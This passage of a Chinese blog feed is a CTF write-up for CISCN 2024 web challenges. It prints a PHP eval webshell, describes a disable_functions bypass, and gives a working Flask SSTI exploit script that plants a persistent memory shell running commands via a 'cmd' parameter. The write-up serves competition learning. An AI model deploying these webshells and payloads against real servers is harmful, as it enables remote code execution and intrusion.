variable">$rVkKjU</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>复制到本地一步步 echo 分析出来</p><p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20241215170723989.png" alt="image-20241215170723989"></p><p>那么shell就是：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd_66.99'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>蚁剑连上去，注意密码参数这里是<code>cmd[66.99</code></p><p>index.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">&lt;!-- ../hackme.php --></span><span class="token comment">&lt;!--  ../tips.php  --></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Location: ./index.php?file=hello.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    @<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token punctuation">&#123;</span>        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'../'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/php:\/\/|http|data|ftp|input|%00/i'</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">strlen</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">14</span><span class="token punctuation">)</span>         <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h1>NAIVE!!!&lt;/h1>"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span>             <span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;div style='text-align: center;'>"</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/div>"</span><span class="token punctuation">;</span>                <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>尝试拿蚁剑插件打disable_function能写，但是连 .antproxy.php 上不去，不知道为什么</p><br><p>结束后试了一下直接在 &#x2F;tmp 写马 index.php，然后 fpm 起 phpserver 开在 &#x2F;tmp 下，密码填 &#x2F;tmp&#x2F;index.php 的即可绕过 disable_function 且正常连接</p><p>接下来找flag，本来以为要提权的，找了半天没提权点</p><p><code>find / -type f -name &quot;flag&quot; 2&gt;/dev/null</code>找到了神人flag路径</p><p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20241215204605743.png" alt="image-20241215204605743"></p><hr><h1 id="safeproxy"><a href="#safeproxy" class="headerlink" title="safeproxy"></a>safeproxy</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template_string<span class="token keyword">import</span> socket<span class="token keyword">import</span> threading<span class="token keyword">import</span> htmlapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'&lt;pre>'</span><span class="token operator">+</span>html<span class="token punctuation">.</span>escape<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'&lt;/pre>'</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">template</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    template_code <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">)</span>    <span class="token comment"># 安全过滤</span>    blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'__'</span><span class="token punctuation">,</span> <span class="token string">'import'</span><span class="token punctuation">,</span> <span class="token string">'os'</span><span class="token punctuation">,</span> <span class="token string">'sys'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'subprocess'</span><span class="token punctuation">,</span> <span class="token string">'popen'</span><span class="token punctuation">,</span> <span class="token string">'system'</span><span class="token punctuation">,</span> <span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> black <span class="token keyword">in</span> blacklist<span class="token punctuation">:</span>        <span class="token keyword">if</span> black <span class="token keyword">in</span> template_code<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"Forbidden content detected!"</span>    result <span class="token operator">=</span> render_template_string<span class="token punctuation">(</span>template_code<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">'ok'</span> <span class="token keyword">if</span> result <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">else</span> <span class="token string">'error'</span><span class="token keyword">class</span> <span class="token class-name">HTTPProxyHandler</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> target_host<span class="token punctuation">,</span> target_port<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>target_host <span class="token operator">=</span> target_host        self<span class="token punctuation">.</span>target_port <span class="token operator">=</span> target_port    <span class="token keyword">def</span> <span class="token function">handle_request</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> client_socket<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            request_data <span class="token operator">=</span> <span class="token string">b""</span>            <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>                chunk <span class="token operator">=</span> client_socket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>                request_data <span class="token operator">+=</span> chunk                <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>chunk<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4096</span><span class="token punctuation">:</span>                    <span class="token keyword">break</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> request_data<span class="token punctuation">:</span>                client_socket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">return</span>            <span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> proxy_socket<span class="token punctuation">:</span>                proxy_socket<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>target_host<span class="token punctuation">,</span> self<span class="token punctuation">.</span>target_port<span class="token punctuation">)</span><span class="token punctuation">)</span>                proxy_socket<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>request_data<span class="token punctuation">)</span>                response_data <span class="token operator">=</span> <span class="token string">b""</span>                <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>                    chunk <span class="token operator">=</span> proxy_socket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>                    <span class="token keyword">if</span> <span class="token keyword">not</span> chunk<span class="token punctuation">:</span>                        <span class="token keyword">break</span>                    response_data <span class="token operator">+=</span> chunk            header_end <span class="token operator">=</span> response_data<span class="token punctuation">.</span>rfind<span class="token punctuation">(</span><span class="token string">b"\r\n\r\n"</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> header_end <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>                body <span class="token operator">=</span> response_data<span class="token punctuation">[</span>header_end <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                body <span class="token operator">=</span> response_data                            response_body <span class="token operator">=</span> body            response <span class="token operator">=</span> <span class="token string">b"HTTP/1.1 200 OK\r\n"</span> \                       <span class="token string">b"Content-Length: "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>response_body<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"\r\n"</span> \                       <span class="token string">b"Content-Type: text/html; charset=utf-8\r\n"</span> \                       <span class="token string">b"\r\n"</span> <span class="token operator">+</span> response_body            client_socket<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>response<span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Proxy Error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token keyword">finally</span><span class="token punctuation">:</span>            client_socket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">start_proxy_server</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> target_host<span class="token punctuation">,</span> target_port<span class="token punctuation">)</span><span class="token punctuation">:</span>    proxy_handler <span class="token operator">=</span> HTTPProxyHandler<span class="token punctuation">(</span>target_host<span class="token punctuation">,</span> target_port<span class="token punctuation">)</span>    server_socket <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    server_socket<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>    server_socket<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Proxy server is running on </span><span class="token interpolation"><span class="token punctuation">&#123;</span>host<span class="token punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>port<span class="token punctuation">&#125;</span></span><span class="token string"> and forwarding to </span><span class="token interpolation"><span class="token punctuation">&#123;</span>target_host<span class="token punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>target_port<span class="token punctuation">&#125;</span></span><span class="token string">..."</span></span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            client_socket<span class="token punctuation">,</span> addr <span class="token operator">=</span> server_socket<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Connection from </span><span class="token interpolation"><span class="token punctuation">&#123;</span>addr<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>proxy_handler<span class="token punctuation">.</span>handle_request<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>client_socket<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            thread<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>            thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Shutting down proxy server..."</span><span class="token punctuation">)</span>    <span class="token keyword">finally</span><span class="token punctuation">:</span>        server_socket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">run_flask_app</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    proxy_host <span class="token operator">=</span> <span class="token string">"0.0.0.0"</span>    proxy_port <span class="token operator">=</span> <span class="token number">5001</span>    target_host <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span>    target_port <span class="token operator">=</span> <span class="token number">5000</span>    <span class="token comment"># 安全反代，防止针对响应头的攻击</span>    proxy_thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>start_proxy_server<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>proxy_host<span class="token punctuation">,</span> proxy_port<span class="token punctuation">,</span> target_host<span class="token punctuation">,</span> target_port<span class="token punctuation">)</span><span class="token punctuation">)</span>    proxy_thread<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>    proxy_thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Starting Flask app..."</span><span class="token punctuation">)</span>    run_flask_app<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一眼打ssti，ban 了响应头</p><p>打内存马在响应体里就行</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> fenjing<span class="token keyword">import</span> logging<span class="token keyword">import</span> requestslogging<span class="token punctuation">.</span>basicConfig<span class="token punctuation">(</span>level<span class="token operator">=</span>logging<span class="token punctuation">.</span>INFO<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token triple-quoted-string string">"""[    app.view_functions    for app in [ __import__('sys').modules["__main__"].app ]    for request in [ __import__('sys').modules["__main__"].request ]    if [        app.__dict__.update(&#123;'_got_first_request':False&#125;),        app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\"global CmdResp;CmdResp=__import__(\'flask\').make_response(__import__(\'os\').popen(request.args.get(\'cmd\')).read())\")==None else resp)    ]]"""</span><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    blacklist <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token string">'\\'</span> <span class="token punctuation">,</span> <span class="token string">'__'</span><span class="token punctuation">,</span> <span class="token string">'import'</span><span class="token punctuation">,</span> <span class="token string">'os'</span><span class="token punctuation">,</span> <span class="token string">'sys'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'subprocess'</span><span class="token punctuation">,</span> <span class="token string">'popen'</span><span class="token punctuation">,</span> <span class="token string">'system'</span><span class="token punctuation">,</span> <span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span>    <span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token builtin">all</span><span class="token punctuation">(</span>word <span class="token keyword">not</span> <span class="token keyword">in</span> s <span class="token keyword">for</span> word <span class="token keyword">in</span> blacklist<span class="token punctuation">)</span>full_payload_gen <span class="token operator">=</span> fenjing<span class="token punctuation">.</span>FullPayloadGen<span class="token punctuation">(</span>waf<span class="token punctuation">)</span>payload<span class="token punctuation">,</span> will_print <span class="token operator">=</span> full_payload_gen<span class="token punctuation">.</span>generate<span class="token punctuation">(</span>    fenjing<span class="token punctuation">.</span>const<span class="token punctuation">.</span>EVAL<span class="token punctuation">,</span> <span class="token punctuation">(</span>fenjing<span class="token punctuation">.</span>const<span class="token punctuation">.</span>STRING<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token keyword">not</span> will_print<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"这个payload不会产生回显"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>    <span class="token string">"http://47.93.212.188:32936"</span><span class="token punctuation">,</span>    data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"code"</span><span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20241215100840684.png" alt="image-20241215100840684"></p><hr><h1 id="sxweb1（Unsolved）"><a href="#sxweb1（Unsolved）" class="headerlink" title="sxweb1（Unsolved）"></a>sxweb1（Unsolved）</h1><p>Apache&#x2F;2.4.58</p><p>直接访问 publishers.php，返回<code>more lines returned. maybe SQL injection Attack</code></p><hr><h1 id="easyweb（Unsolved）"><a href="#easyweb（Unsolved）" class="headerlink" title="easyweb（Unsolved）"></a>easyweb（Unsolved）</h1><p>进去403，开扫</p><p>有一个上传文件的接口和一个下载文件的接口</p><p>下载文件限制后缀为 .txt 和 .zip</p><p>上传文件限制后缀为图片且无回显路径</p><hr><h1 id="sxweb2（Unsolved）"><a href="#sxweb2（Unsolved）" class="headerlink" title="sxweb2（Unsolved）"></a>sxweb2（Unsolved）</h1><p>看起来像是 1 的进阶版，实际上 1 还是0解</p><p>进去发现路径直接在 &#x2F;cgi-bin&#x2F;index.py 了</p><p>单独访问 &#x2F;cgi-bin&#x2F; 得到</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">/    html/        index.html        apache.jpg    db/        pubs.db    cgi-bin/        local/            flag.py        index.cgi        authors.py        index.py        wget.py        update_authorsform.py        updateauthor.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是直接访问 &#x2F;cgi-bin&#x2F;local&#x2F;flag.py 会返回403</p><p>尝试通过 wget.py 访问 127.0.0.1&#x2F;cgi-bin&#x2F;local&#x2F;flag.py ，返回 Notice: local access is not allowed</p><p>&#x2F;bin&#x2F;authors.py</p><p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20241215210603673.png" alt="image-20241215210603673"></p><p>&#x2F;cgi-bin&#x2F;update_authorsform.py</p><p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20241215210619778.png" alt="image-20241215210619778"></p><p>&#x2F;cgi-bin&#x2F;updateauthor.py</p><p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20241215210707260.png" alt="image-20241215210707260"></p><hr><h1 id="BookManager（Unsolved）"><a href="#BookManager（Unsolved）" class="headerlink" title="BookManager（Unsolved）"></a>BookManager（Unsolved）</h1>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;一觉醒来NISA实力下降一万倍，哈哈两人退役之后我们完蛋了&lt;/p&gt;
&lt;p&gt;这b web真是一天比一天难打了，梭哈半天拿不下少解题，其他题回头就被打烂&lt;/p&gt;
&lt;p&gt;学web救不了NISA，唉我好菜啊😭&lt;/p&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/16750&quot;&gt;https://xz.aliyun.com/t/16750&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/16792&quot;&gt;https://xz.aliyun.com/t/16792&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTF线上赛" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
  </entry>
  
</feed>
